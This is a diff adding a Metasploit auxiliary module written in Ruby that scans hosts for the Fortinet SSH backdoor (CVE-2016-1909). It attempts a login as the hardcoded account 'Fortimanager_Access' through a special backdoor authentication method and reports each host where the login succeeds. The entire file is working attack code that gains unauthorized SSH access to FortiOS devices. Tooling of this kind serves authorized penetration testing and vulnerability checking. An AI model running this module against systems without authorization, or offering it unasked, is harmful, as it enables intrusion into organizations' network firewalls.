@@ -1,0 +1,75 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core/exploit/fortinet'
+
+class Metasploit4 < Msf::Auxiliary
+
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Fortinet SSH Backdoor Scanner',
+      'Description'    => %q{
+        This module scans for the Fortinet SSH backdoor.
+      },
+      'Author'         => [
+        'operator8203 <operator8203[at]runbox.com>', # PoC
+        'wvu'                                        # Module
+      ],
+      'References'     => [
+        ['CVE', '2016-1909'],
+        ['EDB', '39224'],
+        ['PACKETSTORM', '135225'],
+        ['URL', 'http://seclists.org/fulldisclosure/2016/Jan/26'],
+        ['URL', 'https://blog.fortinet.com/post/brief-statement-regarding-issues-found-with-fortios']
+      ],
+      'DisclosureDate' => 'Jan 09 2016',
+      'License'        => MSF_LICENSE
+    ))
+
+    register_options([
+      Opt::RPORT(22)
+    ])
+
+    register_advanced_options([
+      OptBool.new('SSH_DEBUG', [false, 'SSH debugging', false]),
+      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
+    ])
+  end
+
+  def run_host(ip)
+    begin
+      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        Net::SSH.start(
+          ip,
+          'Fortimanager_Access',
+          port: datastore['RPORT'],
+          auth_methods: ['fortinet-backdoor'],
+          verbose: datastore['SSH_DEBUG'] ? :debug : nil
+        )
+      end
+    rescue Net::SSH::Exception => e
+      vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
+      return
+    end
+
+    if ssh
+      print_good("#{ip}:#{rport} - Logged in as Fortimanager_Access")
+      report_vuln(
+        :host => ip,
+        :name => self.name,
+        :refs => self.references,
+        :info => ssh.transport.server_version.version
+      )
+    end
+  end
+
+  def rport
+    datastore['RPORT']
+  end
+
+end
